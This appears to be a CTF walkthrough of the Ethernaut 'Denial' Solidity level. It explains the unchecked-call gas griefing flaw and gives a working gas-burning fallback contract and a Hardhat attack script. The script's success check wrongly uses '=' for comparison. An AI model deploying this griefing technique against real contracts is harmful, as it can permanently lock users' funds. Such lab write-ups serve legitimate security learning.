# Ethernaut Walkthrough: Denial
## Welcome to KweenBirb's 21st installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to Denial.sol, the 21st challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt and .sol files in this directory. Let's begin!

OpenZeppelin instructs us that to beat this level we must 'deny the owner from withdrawing funds when they call withdraw().'

Based on the information given, the withdraw() function's code seems like a logical enough place to start inspecting the Ethernaut's Denial contract! There are even comments within the function code to ensure us that the function behaves as expected and could not possibly be exploitable:

```
// withdraw 1% to recipient and 1% to owner
function withdraw() public {
    uint amountToSend = address(this).balance.div(100);
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call{value:amountToSend}("");
    owner.transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = now;
    withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
}
```

### Always take comments at face value, duh! (lol)

Drat! Well, if the comments say the code is bulletproof, it must be true, right? Psh, we know better than that. The function divides the Denial contract's ether balance into 1%:

```address(this).balance.div(100)```

and subsequently sends that amount to the contract's withdrawal partner address from storage and then sends the same amount to the owner of the Denial contract. Knowing that our goal is to prevent this function from being able to complete the 

```owner.transfer(amountToSend)```

line, the clearest way to achieve this would be to set the partner address variable in storage to a malicious contract of our own making and cause any low level ether calls to our malicious contract to revert.

### Not so fast!

But wait! Low level ether calls by definition will never halt execution, regardless of reversion. In fact, wrapping low level ether calls in a higher level assertion has become an important standard for handling errors when writing in Solidity. You've probably seen this Solidity development pattern before; one common implementation of such an assertion might look like this:

```
(bool r,) = partner.call{value:amountToSend}("");
require(r);
```

This way, if the low level ether call reverts for being sent to a non-payable method or a contract without a payable fallback, the require() check will halt execution and refund gas when it would otherwise continue execution despite the low level call's reversion.

### Yes, Solidity is a strange language indeed

So the comments assuring us that the function will move on to the next line and perform the transfer to the owner is at least half correct. Why only 'half correct,' do you ask? There's still one reversion case which has not been handled here. 

Can you guess what it is? Here's a hint: the Ethereum Virtual Machine (EVM) needs a way to prevent permissionless user transactions from eating up all network resources with infinite loops and recursion. This mechanism can be abused here to force a revert even when Ethernaut is using an unchecked low level call!

### GAS

The EVM's gas mechanism is designed to protect the network from being dragged into infinite loops or recursive lookups that could grind Ethereum to a halt. This is the mechanism we're looking to exploit: we could write a malicious contract that uses up all the remaining gas in its fallback! The result? When Denial performs its external call to our malicious 'partner', which will consume all remaining gas in its fallback. As a result, there will never be enough gas left to reach and execute the code on line 31! The transaction can never complete execution! 

Since we've decided on our approach to brick Denial on a high level, let's implement the griefing hack.

### Write code to do the thing

Usually when writing Solidity our aim is to consume as little gas as possible by using optimized code. This time, however, we can consume it willy nilly. A while loop should suffice.

```
fallback() external payable {
    // eat up all the rest of the gas when Denial sends funds to this addr
    uint start = gasleft();
    while (gasleft() <= start) {
        // do something to consume gas
    }
}
```

Be sure to include the ```payable``` keyword so that our malicious contract won't reject ether and revert before even reaching our while loop! That would allow execution to continue as the Denial developer expected when writing their comment in the withdraw() function.

Any operation that consumes gas will do, so I settled on simply incrementing a variable:

```
fallback() external payable {
    // eat up all the rest of the gas when Denial sends funds to this addr
    uint i;
    uint start = gasleft();
    while (gasleft() <= start) {
        i++;
    }
}
```

### Do the thing

To execute the hack, we'll be using Hardhat with the Ethersjs library to deploy and subsequently call our malicious contract. First we import Hardhat in our attack script, cleverly named 'attack.js'

```const hre = require("hardhat");```

Then we'll instantiate the Ethernaut Denial contract and grab its current balance to ensure everything worked properly at the end:

```
async function main() {
    const instanceAddress = "0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e"; // my Ethernaut Denial address- replace with $YOUR_ETHERNAUT_ADDRESS_HERE
    const Instance = await hre.ethers.getContractAt("Denial", instanceAddress);
    const balanceBefore = await Instance.contractBalance();

    // ...
}
```

Next we'll deploy our malicious Attack contract from Solution.sol:

```
    // ...
    
    const Attack = await hre.ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(instanceAddress);

    await attack.deployed();

    console.log("Attack deployed to:", attack.address);
    
    // ...
```

Finally we perform the attack and grab the final balance to compare to the first contractBalance() call. If the values match, we've successfully bricked Denial!

```
    // ...

    const Contract = await hre.ethers.getContractAt("Attack", attack.address);
    await Contract.attack();

    const balanceAfter = await Instance.contractBalance();
    if (balanceBefore = balanceAfter) {
        console.log("Success! No funds were moved: Denial has been bricked.");
    }
```

Add an invocation of the main() function we've just implemented to the bottom of the script and we're ready to run! Here's the final product (also viewable in this directory's attack.js file):

```
const hre = require("hardhat");

async function main() {
    const instanceAddress = "0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e"; // my Ethernaut Denial address- replace with $YOUR_ETHERNAUT_ADDRESS_HERE
    const Instance = await hre.ethers.getContractAt("Denial", instanceAddress);
    const balanceBefore = await Instance.contractBalance();

    const Attack = await hre.ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(instanceAddress);

    await attack.deployed();

    console.log("Attack deployed to:", attack.address);
    
    const Contract = await hre.ethers.getContractAt("Attack", attack.address);
    await Contract.attack();

    const balanceAfter = await Instance.contractBalance();
    if (balanceBefore = balanceAfter) {
        console.log("Success! No funds were moved: Denial has been bricked.");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

Just run using 

```node attack.js``` 

or if you set up a full Hardhat repo 

```npx hardhat run scripts/attack.js```

Well done, griefer!

### Takeaways

There's a reason Solidity best practices dictate that we should always check return values on low level calls. Do it, every time. There will always be a way to ensure that execution continues even on an external revert- leaving out low level boolean results is never the best way!

Always consider the EVM's gas mechanisms in their entirety; Solidity is a strange language in that gas plays a vital role in all execution. There's more to think about than just optimizations!

Unfortunately the blockchain is much like the internet in that it is a highly adversarial environment. Pseudonymous internet actors are prone to griefing attacks even when they do not derive any benefit from breaking things.

○•○ h00t h00t ○•○
